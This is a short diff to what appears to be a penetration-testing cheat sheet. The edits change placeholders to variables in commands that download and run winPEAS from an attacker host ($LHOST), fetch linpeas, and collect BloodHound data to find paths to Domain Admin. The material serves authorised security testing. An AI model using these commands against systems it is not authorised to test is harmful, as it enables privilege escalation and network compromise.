@@ -38,7 +38,7 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 **Windows:**
 
 ```powershell
-iwr -uri http://<attacker-ip>/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\winpeas.exe
+iwr -uri http://$LHOST/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\winpeas.exe
 ```
 
 !!! tip "Real-world"
@@ -84,7 +84,7 @@ See [Privilege Abuse](windows/privilege-abuse.md), [Service Exploitation](window
 Don't guess at AD attacks, collect BloodHound data first and let it show you the shortest path to Domain Admin.
 
 ```bash
-bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip
+bloodhound-python -c all -d $DOMAIN -u <user> -p '<pass>' -ns $DC_IP --zip
 ```
 
 Then in BloodHound, run: **Shortest Paths to Domain Admins**.
